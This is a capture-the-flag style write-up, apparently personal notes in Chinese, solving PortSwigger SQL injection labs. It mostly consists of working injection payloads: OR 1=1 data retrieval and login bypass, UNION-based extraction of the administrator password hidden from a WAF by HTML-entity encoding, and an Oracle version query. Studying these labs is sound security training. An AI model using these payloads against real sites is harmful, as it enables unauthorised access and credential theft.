---
title: PortSwigger
description: PortSwigger
---

## SQL Injection

### Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

Payload

```
?category=Accessories' OR 1=1--
```

SQL

```sql
SELECT ... FROM products WHERE category = 'Accessories' OR 1=1--'
```

### Lab: SQL injection vulnerability allowing login bypass

Payload

```
administrator' OR 1=1--
```

### Lab: SQL injection with filter bypass via XML encoding

先嘗試用 `UNION SELECT NULL` 來判斷前面的 `SELECT` 選了幾個 columns

```
1 UNION SELECT NULL--
1 UNION SELECT NULL,NULL--
```

Payload

```
1 UNION SELECT password FROM users where username = 'administrator'--
```

SQL

```sql
SELECT unit FROM stocks WHERE productId = 1 AND storeId = 1 UNION SELECT password FROM users where username = 'administrator'--'
```

轉換成 HTML Entity 來繞過 WAF

```
&#49;&#32;&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;&#32;&#70;&#82;&#79;&#77;&#32;&#117;&#115;&#101;&#114;&#115;&#32;&#119;&#104;&#101;&#114;&#101;&#32;&#117;&#115;&#101;&#114;&#110;&#97;&#109;&#101;&#32;&#61;&#32;&#39;&#97;&#100;&#109;&#105;&#110;&#105;&#115;&#116;&#114;&#97;&#116;&#111;&#114;&#39;&#45;&#45;
```

最終在 F12 > console 送出的 fetch 請求

```js
fetch("/product/stock", {
  headers: {
    "content-type": "application/xml",
  },
  body: '<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>&#49;&#32;&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;&#32;&#70;&#82;&#79;&#77;&#32;&#117;&#115;&#101;&#114;&#115;&#32;&#119;&#104;&#101;&#114;&#101;&#32;&#117;&#115;&#101;&#114;&#110;&#97;&#109;&#101;&#32;&#61;&#32;&#39;&#97;&#100;&#109;&#105;&#110;&#105;&#115;&#116;&#114;&#97;&#116;&#111;&#114;&#39;&#45;&#45;</storeId></stockCheck>',
  method: "POST",
})
  .then((res) => res.text())
  .then((res) => console.log(res));
```

console 的結果

```
020yk5zmzoy92jl364rg
217 units
```

接下來用 `administrator` + `020yk5zmzoy92jl364rg` 就可以成功登入～

### Lab: SQL injection attack, querying the database type and version on Oracle

題目給的 Hint 很重要:

On Oracle databases, every `SELECT` statement must specify a table to select `FROM`. If your `UNION SELECT` attack does not query from a table, you will still need to include the `FROM` keyword followed by a valid table name.

There is a built-in table on Oracle called `dual` which you can use for this purpose. For example: `UNION SELECT 'abc' FROM dual`

先嘗試用 `UNION SELECT NULL FROM dual` 來判斷前面的 `SELECT` 選了幾個 columns

```
?category=Accessories' UNION SELECT NULL FROM dual--
?category=Accessories' UNION SELECT NULL,NULL FROM dual--
```

Payload

```
?category=Accessories' UNION SELECT banner,NULL FROM v$version--
```

SQL

```sql
SELECT ... FROM products WHERE category = 'Accessories' UNION SELECT banner,NULL FROM v$version--'
```

## 參考資料
